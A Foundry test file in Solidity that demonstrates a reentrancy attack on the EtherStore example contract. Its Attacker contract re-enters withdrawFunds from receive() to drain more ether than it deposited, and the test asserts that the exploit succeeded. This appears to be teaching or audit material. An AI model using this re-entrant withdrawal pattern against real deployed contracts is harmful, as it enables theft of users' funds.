
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Constrain attackVal to be within withdrawal limit and reasonable bounds
        vm.assume(attackVal > 0.01 ether && attackVal <= 1 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The withdrawFunds function requires:
        // 1. User has sufficient balance
        // 2. Amount is within withdrawal limit (1 ether)
        // 3. At least 1 week has passed since last withdrawal
        
        // We'll warp time forward to satisfy the time requirement
        vm.warp(block.timestamp + 1 weeks);

        // --- 3. Funding ---
        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 10);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to establish balance
        _victim.depositFunds{value: val}();
    }

    function attack(uint256 val) public {
        // Capture initial balance before attack
        initialSnapshot = address(this).balance;

        // Store the value for re-entrant calls
        storedAttackVal = val;

        // Call the vulnerable withdrawFunds function
        _victim.withdrawFunds(val);

        // Check if reentrancy was successful
        // If we called withdraw more than once, the attack succeeded
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also verify we received more than we should have
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't exceeded our limit and victim still has funds
        if (attackCallCount < 3 && address(_victim).balance >= storedAttackVal) {
            _victim.withdrawFunds(storedAttackVal);
        }
    }
}
